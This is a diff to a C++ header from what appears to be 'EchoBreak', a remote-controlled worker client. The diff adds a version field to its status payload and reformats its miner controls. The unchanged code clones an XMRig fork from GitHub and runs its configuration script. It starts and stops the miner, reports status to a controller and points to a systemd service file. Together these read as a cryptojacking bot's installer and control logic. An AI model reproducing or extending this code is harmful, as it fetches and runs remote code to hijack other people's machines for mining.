@@ -13,6 +13,8 @@
 #define MINER_GH std::string("https://github.com/4rch1nx/EchoBreak-xmrig.git")
 #define SERVICE "/etc/systemd/system/eb.service";
 
+#define VERSION (std::string)"2.3"
+
 struct JsonPayload
 {
     std::string name;
@@ -20,6 +22,7 @@ struct JsonPayload
     std::string status;
     std::string xmrig_status;
     std::string err;
+    std::string ver;
 };
 
 class Worker_utils
@@ -46,8 +49,6 @@ public:
     void receive(std::vector<std::string> &messages);
     void send(std::string data);
     void sendStatus();
-
-    // Returns a filename
     
     // Xmrig
     inline void instXmrig()
@@ -55,8 +56,22 @@ public:
         system(("rm -rf EchoBreak-xmrig && git clone " + MINER_GH).c_str());
         system("chmod +x EchoBreak-xmrig/conf && EchoBreak-xmrig/./conf");
     };
-    inline void runXmrig() { system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig"); is_xmrig_running = "runnning"; std::ofstream ix("ix", std::ios::out); ix << "1"; ix.close();};
-    inline void stopXmrig() { system("pkill xmrig"); is_xmrig_running = "standby"; std::ofstream ix("ix", std::ios::out); ix << "0"; ix.close(); };
+
+    inline void runXmrig() 
+    { 
+        system("EchoBreak-xmrig/xmrig-6.22.2/./xmrig"); 
+        is_xmrig_running = "runnning"; 
+        std::ofstream ix("ix", std::ios::out); // is xmrig running (xmrig toggle)
+        ix << "1"; ix.close();
+    };
+
+    inline void stopXmrig() 
+    { 
+        system("pkill xmrig"); 
+        is_xmrig_running = "standby"; 
+        std::ofstream ix("ix", std::ios::out); //  is xmrig running (xmrig toggle)
+        ix << "0"; ix.close(); 
+    };
     
     // :)
     inline void openUrl(std::string url) { system(("yandex-browser-stable --no-sandbox " + url).c_str()); }; // Replace to your browser
